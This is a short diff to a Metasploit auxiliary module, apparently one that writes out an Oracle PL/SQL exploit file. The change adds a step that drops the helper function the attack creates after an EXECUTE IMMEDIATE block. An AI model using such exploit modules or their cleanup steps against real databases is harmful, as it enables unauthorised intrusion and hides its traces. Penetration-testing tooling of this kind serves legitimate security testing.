@@ -70,6 +70,8 @@ class Metasploit3 < Msf::Auxiliary
 			EXECUTE IMMEDIATE #{rand2};
 			END;
 			/
+			DROP FUNCTION #{name};
+			/
 			|
 
 		print_status("Creating '#{datastore['FILENAME']}' file ...")		
